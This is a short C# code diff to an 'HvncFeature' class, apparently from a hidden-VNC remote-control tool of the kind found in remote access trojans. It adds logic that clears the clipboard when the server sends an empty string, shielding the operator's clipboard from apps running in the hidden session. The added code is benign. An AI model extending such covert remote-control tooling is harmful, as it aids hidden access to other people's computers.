@@ -429,7 +429,15 @@ internal static class HvncFeature
 
     public static unsafe void SetClipboard(string text)
     {
-        // Clipboard is window-station-wide — no SetThreadDesktop needed
+        // Clipboard is window-station-wide — no SetThreadDesktop needed.
+        // Empty string = clear only: server sends this when sync is disabled so that
+        // HVNC apps cannot read the operator's clipboard via right-click → Paste.
+        if (string.IsNullOrEmpty(text))
+        {
+            if (OpenClipboard(0)) { EmptyClipboard(); CloseClipboard(); }
+            return;
+        }
+
         if (!OpenClipboard(0)) return;
         bool ok = false;
         try
